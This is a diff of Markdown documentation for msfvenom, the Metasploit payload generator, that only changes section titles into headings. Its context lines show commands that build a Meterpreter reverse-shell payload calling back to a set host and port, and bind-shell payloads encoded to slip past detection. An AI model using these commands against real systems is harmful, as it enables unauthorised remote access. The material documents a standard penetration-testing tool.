@@ -22,7 +22,7 @@ Options:
         --help-formats               List available formats
 ```
 
-**How to generate a payload**
+# How to generate a payload
 
 To generate a payload, there are two flags that you must supply (-p and -f):
 
@@ -61,7 +61,7 @@ $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.64 lport=4444 -f
 ```
 
 
-**How to encode a payload**
+# How to encode a payload
 
 By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following:
 
@@ -81,7 +81,7 @@ You can also encode the payload multiple times using the -i flag. Sometimes more
 ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
 ```
 
-**How to avoid bad characters**
+# How to avoid bad characters
 
 The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload:
 
@@ -89,7 +89,7 @@ The -b flag is meant to be used to avoid certain characters in the payload. When
 ./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
 ```
 
-**How to supply a custom template**
+# How to supply a custom template
 
 By default, msfvenom uses templates from the msf/data/templates directory. If you'd like to choose your own, you can use the -x flag like the following:
 
